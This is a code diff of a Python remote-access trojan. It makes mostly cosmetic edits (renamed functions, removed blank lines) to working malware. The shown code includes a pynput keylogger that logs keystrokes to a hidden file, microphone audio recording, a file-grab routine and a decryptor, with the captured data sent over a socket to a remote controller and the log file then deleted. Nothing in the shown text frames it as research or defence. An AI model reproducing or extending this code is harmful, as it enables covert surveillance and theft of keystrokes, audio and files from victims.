@@ -108,7 +108,7 @@ def decryptor():
         Err="Decryption was unsuccessful"
         s.send(Err.encode())
 def keylog(): 
-    def key_press(key):
+    def process_key_press(key):
             try:
                 current_key = '{0} pressed'.format(key)
             
@@ -118,14 +118,14 @@ def keylog():
                     f.write(str(key)+".pressed'..'")
             except AttributeError:
                     f.write('>uk<')
-    def key_release(key):
+    def process_key_press2(key):
             try:
                 current_key = '{0} pressed'.format(key)       
                 with open("__.txt","a+") as f:
                     f.write(str(key)+".released'..'")
             except AttributeError:
                 f.write("<uk>")
-    keyboard_listener = pynput.keyboard.Listener(on_press=key_press , on_release=key_release)
+    keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press , on_release=process_key_press2)
     with keyboard_listener: 
         keyboard_listener.join()
 
@@ -139,27 +139,19 @@ def cd():
                os.chdir(file_path)
                volchanged="Changed volumes successfully"
                s.send(volchanged.encode())
-
               
        elif file_path.endswith(""):
                os.chdir(file_path)
                dirchanged="Changed directory successfully"
-               s.send(file_path.encode())
-
-               
+               s.send(file_path.encode())    
        else:
                os.chdir(file_path)
                dirchanged="Changed directory successfully"
                s.send(file_path.encode())
-
-               
-    
     except:
        failed="could not cd into directory/volume"
        s.send(failed.encode())
-
-
-       
+   
 def grab():
     global s
     try:      
@@ -204,9 +196,7 @@ def grab():
               
                  else:
                      s.recv(1024) 
-
-               
-         
+  
          else : 
                  error="File not found here"
 
@@ -238,23 +228,13 @@ def audcap():
                             rate=fs,
                             frames_per_buffer=chunk,
                             input=True)
-
             frames = []  
-
-
             for i in range(0, int(fs / chunk * seconds)):
                 data = stream.read(chunk,exception_on_overflow=False)
                 frames.append(data)
-
-
             stream.stop_stream()
             stream.close()
-
             p.terminate()
-
-
-
-
             wf = wave.open(filename, 'wb')
             wf.setnchannels(channels)
             wf.setsampwidth(p.get_sample_size(sample_format))
@@ -446,12 +426,9 @@ def main():
                      file_data=file_get.read(file_size)
                      s.send(file_data)
                      file_get.close()
-                   
                      os.remove('__.txt')
-                     global m
-                     m.start()
                 except:
-                     c="could not capture key strokes"
+                     c="could not capture key stroke"
                      s.send(c.encode())
                         
                 
@@ -495,25 +472,3 @@ m.setDaemon(True)
 if __name__=="__main__":
     m.start()
     main()
-    
-
-
-    
-
-    
-
-    
-    
-
-                
-            
-            
-                
-            
-            
-            
-            
-            
-    
-
-    
